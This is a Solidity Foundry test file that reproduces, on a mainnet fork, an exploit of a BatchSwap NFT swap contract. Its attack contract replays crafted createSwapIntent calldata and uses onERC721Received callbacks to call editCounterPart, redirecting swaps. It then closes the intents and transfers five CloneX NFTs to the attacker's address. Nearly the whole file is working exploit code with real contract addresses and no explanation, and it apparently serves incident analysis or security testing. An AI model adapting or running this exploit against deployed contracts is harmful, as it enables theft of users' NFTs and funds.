
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 18799487;
    uint256 constant TX_TIMESTAMP = 1702740179;
    uint256 constant TX_BLOCK_NUMBER = 18799488;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.CloneX, "CloneX", 5);
    }
}

contract OurAttack {












    function attack() external payable {
        _attack();
    }

    function _nftCb() internal {
        _markCallback(0);
    }

    function _nftCb2() internal {
        _markCallback(1);
    }

    function _nftCb3() internal {
        _markCallback(2);
    }

    function _nftCb4() internal {
        _markCallback(3);
    }

    function _nftCb5() internal {
        _markCallback(4);
    }

    function _nftCb6() internal {
        _markCallback(5);
        IBatchSwap(Addresses.BatchSwap).editCounterPart(10351, Addresses.A_239389_73DB);
    }

    function _nftCb7() internal {
        _markCallback(6);
        IBatchSwap(Addresses.BatchSwap).editCounterPart(10354, Addresses.A_239389_73DB);
    }

    function _nftCb8() internal {
        _markCallback(7);
        IBatchSwap(Addresses.BatchSwap).editCounterPart(10352, Addresses.A_239389_73DB);
    }

    function _nftCb9() internal {
        _markCallback(8);
        IBatchSwap(Addresses.BatchSwap).editCounterPart(10353, Addresses.A_239389_73DB);
    }

    function _nftCb10() internal {
        _markCallback(9);
        IBatchSwap(Addresses.BatchSwap).editCounterPart(10355, Addresses.A_239389_73DB);
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(0)),
                bytes32(uint256(1113630167997902229231994619202375575496261168352))
            );
        IUNI_V3_POS(Addresses.UNI_V3_POS).setApprovalForAll(Addresses.BatchSwap, true);
        ICloneX(Addresses.CloneX).isApprovedForAll(Addresses.A_239389_73DB, Addresses.BatchSwap);
        {
            bytes memory replayCallData =
                hex"c041abb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe8800000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000098c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000286f00000000000000000000000049cf6f5d44e70224e2e23fdcdd2c053f30ada28b00000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000001a0e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.BatchSwap).call{value: 5000000000000000}(replayCallData);
            require(ok, "replay selector 0xc041abb1 failed");
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IBatchSwap(Addresses.BatchSwap).closeSwapIntent{value: 5000000000000000}(address(this), 10351);
        ICloneX(Addresses.CloneX).safeTransferFrom(address(this), Addresses.attacker_eoa, 6670);
        {
            bytes memory replayCallData =
                hex"c041abb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe8800000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000098c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000287000000000000000000000000049cf6f5d44e70224e2e23fdcdd2c053f30ada28b00000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000019fa00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.BatchSwap).call{value: 5000000000000000}(replayCallData);
            require(ok, "replay selector 0xc041abb1 failed");
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IBatchSwap(Addresses.BatchSwap).closeSwapIntent{value: 5000000000000000}(address(this), 10352);
        ICloneX(Addresses.CloneX).safeTransferFrom(address(this), Addresses.attacker_eoa, 6650);
        {
            bytes memory replayCallData =
                hex"c041abb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe8800000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000098c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000287100000000000000000000000049cf6f5d44e70224e2e23fdcdd2c053f30ada28b00000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000012eb00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.BatchSwap).call{value: 5000000000000000}(replayCallData);
            require(ok, "replay selector 0xc041abb1 failed");
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IBatchSwap(Addresses.BatchSwap).closeSwapIntent{value: 5000000000000000}(address(this), 10353);
        ICloneX(Addresses.CloneX).safeTransferFrom(address(this), Addresses.attacker_eoa, 4843);
        {
            bytes memory replayCallData =
                hex"c041abb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe8800000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000098c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000287200000000000000000000000049cf6f5d44e70224e2e23fdcdd2c053f30ada28b00000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000153800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.BatchSwap).call{value: 5000000000000000}(replayCallData);
            require(ok, "replay selector 0xc041abb1 failed");
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IBatchSwap(Addresses.BatchSwap).closeSwapIntent{value: 5000000000000000}(address(this), 10354);
        ICloneX(Addresses.CloneX).safeTransferFrom(address(this), Addresses.attacker_eoa, 5432);
        {
            bytes memory replayCallData =
                hex"c041abb1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001c0000000000000000000000000c36442b4a4522e871399cd717abdd847ab11fe8800000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000098c3000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000287300000000000000000000000049cf6f5d44e70224e2e23fdcdd2c053f30ada28b00000000000000000000000058874d2951524f7f851bbbe240f0c3cf0b992d7900000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000e000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000268e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = payable(Addresses.BatchSwap).call{value: 5000000000000000}(replayCallData);
            require(ok, "replay selector 0xc041abb1 failed");
        }
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(2)), bytes32(uint256(1)));
        IBatchSwap(Addresses.BatchSwap).closeSwapIntent{value: 5000000000000000}(address(this), 10355);
        ICloneX(Addresses.CloneX).safeTransferFrom(address(this), Addresses.attacker_eoa, 9870);
        IUNI_V3_POS(Addresses.UNI_V3_POS).setApprovalForAll(Addresses.BatchSwap, false);
    }

    receive() external payable {}

    function onERC721Received(address arg0, address arg1, uint256 amount, bytes calldata arg3) external payable {
        arg0;
        arg1;
        amount;
        arg3;
        {
            bytes32 bytesHash;
            assembly {
                let offset := calldataload(100)
                let lenPos := add(4, offset)
                if iszero(lt(calldatasize(), add(lenPos, 32))) {
                    let len := calldataload(lenPos)
                    let dataPos := add(lenPos, 32)
                    if iszero(lt(calldatasize(), add(dataPos, len))) {
                        let ptr := mload(0x40)
                        calldatacopy(ptr, dataPos, len)
                        bytesHash := keccak256(ptr, len)
                    }
                }
            }
            if (
                bytesHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db000000000000000000000000000000000000000000000000000000000000286f"
                    )
            ) {
                _nftCb6();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            bytes32 bytesHash;
            assembly {
                let offset := calldataload(100)
                let lenPos := add(4, offset)
                if iszero(lt(calldatasize(), add(lenPos, 32))) {
                    let len := calldataload(lenPos)
                    let dataPos := add(lenPos, 32)
                    if iszero(lt(calldatasize(), add(dataPos, len))) {
                        let ptr := mload(0x40)
                        calldatacopy(ptr, dataPos, len)
                        bytesHash := keccak256(ptr, len)
                    }
                }
            }
            if (
                bytesHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db0000000000000000000000000000000000000000000000000000000000002870"
                    )
            ) {
                _nftCb8();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            bytes32 bytesHash;
            assembly {
                let offset := calldataload(100)
                let lenPos := add(4, offset)
                if iszero(lt(calldatasize(), add(lenPos, 32))) {
                    let len := calldataload(lenPos)
                    let dataPos := add(lenPos, 32)
                    if iszero(lt(calldatasize(), add(dataPos, len))) {
                        let ptr := mload(0x40)
                        calldatacopy(ptr, dataPos, len)
                        bytesHash := keccak256(ptr, len)
                    }
                }
            }
            if (
                bytesHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db0000000000000000000000000000000000000000000000000000000000002871"
                    )
            ) {
                _nftCb9();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            bytes32 bytesHash;
            assembly {
                let offset := calldataload(100)
                let lenPos := add(4, offset)
                if iszero(lt(calldatasize(), add(lenPos, 32))) {
                    let len := calldataload(lenPos)
                    let dataPos := add(lenPos, 32)
                    if iszero(lt(calldatasize(), add(dataPos, len))) {
                        let ptr := mload(0x40)
                        calldatacopy(ptr, dataPos, len)
                        bytesHash := keccak256(ptr, len)
                    }
                }
            }
            if (
                bytesHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db0000000000000000000000000000000000000000000000000000000000002872"
                    )
            ) {
                _nftCb7();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            bytes32 bytesHash;
            assembly {
                let offset := calldataload(100)
                let lenPos := add(4, offset)
                if iszero(lt(calldatasize(), add(lenPos, 32))) {
                    let len := calldataload(lenPos)
                    let dataPos := add(lenPos, 32)
                    if iszero(lt(calldatasize(), add(dataPos, len))) {
                        let ptr := mload(0x40)
                        calldatacopy(ptr, dataPos, len)
                        bytesHash := keccak256(ptr, len)
                    }
                }
            }
            if (
                bytesHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece000000000000000000000000023938954bc875bb8309aef15e2dead54884b73db0000000000000000000000000000000000000000000000000000000000002873"
                    )
            ) {
                _nftCb10();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        {
            bytes32 staticArgsHash;
            assembly {
                let ptr := mload(0x40)
                calldatacopy(ptr, 4, 96)
                staticArgsHash := keccak256(ptr, 96)
            }
            if (
                staticArgsHash
                    == keccak256(
                        hex"000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece0000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c50000000000000000000000000000000000000000000000000000000000098c30"
                    )
            ) {
                uint256 dispatchOrdinal = _nextDispatch(
                    bytes4(
                        keccak256(
                            hex"150b7a02000000000000000000000000c310e760778ecbca4c65b6c559874757a4c4ece0000000000000000000000000871f28e58f2a0906e4a56a82aec7f005b411f5c50000000000000000000000000000000000000000000000000000000000098c30"
                        )
                    )
                );
                if (dispatchOrdinal == 0) {
                    _nftCb6();
                    bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
                if (dispatchOrdinal == 1) {
                    _nftCb8();
                    bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
                if (dispatchOrdinal == 2) {
                    _nftCb9();
                    bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
                if (dispatchOrdinal == 3) {
                    _nftCb7();
                    bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                    assembly { return(add(ret, 32), mload(ret)) }
                }
                if (dispatchOrdinal == 4) {
                    _nftCb10();
                    bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                    assembly { return(add(ret, 32), mload(ret)) }
                }

                _nftCb6();
                bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
                assembly { return(add(ret, 32), mload(ret)) }
            }
        }
        uint256 dispatchOrdinal = _nextDispatch(0x150b7a02);
        if (dispatchOrdinal == 0) {
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 1) {
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 2) {
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 3) {
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 4) {
            bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        bytes memory ret = hex"150b7a0200000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x64882c9f) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_239389_73DB = 0x23938954BC875bb8309AEF15e2Dead54884B73Db;
    address internal constant BatchVault = 0x48c45a687173ec396353cD1E507B26Fa4F6Ff6D9;
    address internal constant CloneX = 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B;
    address internal constant attack_contract = 0x871f28E58f2a0906e4a56a82aEc7f005b411F5c5;
    address internal constant attacker_eoa = 0xb1EdF2a0BA8Bc789cBc3DFbe519737cAdA034D2D;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant BatchSwap = 0xC310e760778ECBca4C65B6C559874757A4c4Ece0;
    address internal constant UNI_V3_POS = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant TS = 0xdbD4264248e2f814838702E0CB3015AC3a7157a1;
}

struct Abi_createSwapIntent_Param0 {
    uint256 field0;
    address field1;
    uint256 field2;
    address field3;
    uint256 field4;
    uint256 field5;
    uint256 field6;
    uint256 field7;
    uint8 field8;
}

struct Abi_createSwapIntent_Param1 {
    address field0;
    address field1;
    uint256[] field2;
    uint256[] field3;
    bytes field4;
}

struct Abi_createSwapIntent_Param2 {
    address field0;
    address field1;
    uint256[] field2;
    uint256[] field3;
    bytes field4;
}

interface IBatchSwap {
    function closeSwapIntent(address, uint256) external payable;
    function createSwapIntent(
        Abi_createSwapIntent_Param0 calldata,
        Abi_createSwapIntent_Param1[] calldata,
        Abi_createSwapIntent_Param2[] calldata
    ) external payable;
    function editCounterPart(uint256, address) external;
}

interface ICloneX {
    function isApprovedForAll(address, address) external view;
    function safeTransferFrom(address, address, uint256) external;
}

interface IUNI_V3_POS {
    function setApprovalForAll(address, bool) external;
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
